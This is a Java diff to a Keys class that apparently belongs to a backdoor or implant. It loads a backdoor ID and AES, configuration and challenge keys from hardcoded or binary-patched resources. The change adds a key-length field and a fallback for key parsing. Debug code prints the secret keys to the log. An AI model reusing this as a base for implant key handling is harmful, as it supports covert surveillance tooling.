@@ -28,6 +28,7 @@ public class Keys {
 	private static final String TAG = "Keys"; //$NON-NLS-1$
 	/** The singleton. */
 	private volatile static Keys singleton;
+	private static int keyLen = 16;
 
 	/**
 	 * Self.
@@ -40,13 +41,13 @@ public class Keys {
 				if (singleton == null) {
 					if (Cfg.KEYS) {
 						singleton = new KeysFake();
-						
+
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " Using hardcoded keys");
 						}
 					} else {
 						singleton = new Keys(true);
-						
+
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " Using binary patched keys");
 						}
@@ -84,10 +85,10 @@ public class Keys {
 			challengeKey = keyFromString(resource, 78, 32);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " backdoorId: " + new String(backdoorId)) ;//$NON-NLS-1$
-				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey)) ;//$NON-NLS-1$
-				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey)) ;//$NON-NLS-1$
-				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey)) ;//$NON-NLS-1$
+				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
+				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey));//$NON-NLS-1$
+				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey));//$NON-NLS-1$
+				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey));//$NON-NLS-1$
 			}
 		}
 	}
@@ -189,21 +190,29 @@ public class Keys {
 
 	private byte[] keyFromString(byte[] resource, int from, int len) {
 		final byte[] res = Utils.copy(resource, from, len);
-		return keyFromString(new String(res));
+		byte[] ret = keyFromString(new String(res));
+
+		if (ret == null) {
+			return Utils.copy(resource, from, 16);
+		} else {
+			return ret;
+		}
 	}
 
 	private byte[] keyFromString(final String string) {
 		try {
-			final int len = 16;
-			final byte[] array = new byte[len];
+			final byte[] array = new byte[keyLen];
 
-			for (int pos = 0; pos < len; pos++) {
+			for (int pos = 0; pos < keyLen; pos++) {
 				final String repr = string.substring(pos * 2, pos * 2 + 2);
 				array[pos] = (byte) Integer.parseInt(repr, 16);
 			}
 
 			return array;
 		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
 
 			return null;
 		}
